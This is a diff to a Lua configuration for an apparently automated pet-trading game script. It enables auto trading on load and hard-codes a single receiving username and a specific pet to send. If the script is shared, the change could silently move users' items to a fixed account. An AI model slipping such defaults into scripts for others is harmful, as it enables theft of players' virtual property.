@@ -10,14 +10,14 @@
             SelectedPets = {}, -- Specific pet IDs to fuse e.g. {"dog", "cat"}
         },
         AutoTrade = {
-            Enabled = false, -- Start auto trading on load
+            Enabled = true, -- Start auto trading on load
             AutoAcceptTrades = true, -- Auto accept trade requests sent TO you
             AutoLeaveAfterTrades = false, -- Leave/kick once every target has nothing left to receive
             LeaveDelay = 5, -- Seconds to wait after trades finish before leaving
-            Usernames = {}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
+            Usernames = {"Crystal0bKingN1381"}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
             TradeMode = "specific", -- "all" = send everything in Categories | "specific" = only the Items list
-            Categories = {}, -- What to send
-            Items = {}, -- Item IDs/names to send when TradeMode = "specific" e.g. {"dog", "cat", "buffalo"}
+            Categories = {"pets"}, -- What to send
+            Items = {"summer_2026_lake_monster"}, -- Item IDs/names to send when TradeMode = "specific" e.g. {"dog", "cat", "buffalo"}
             ItemCounts = {}, -- Max per item per player e.g. {dog = 30, cat = 12} ({} = unlimited)
 
             -- GLOBAL pet filter. Used for ANY pet NOT listed in PetFilters below.
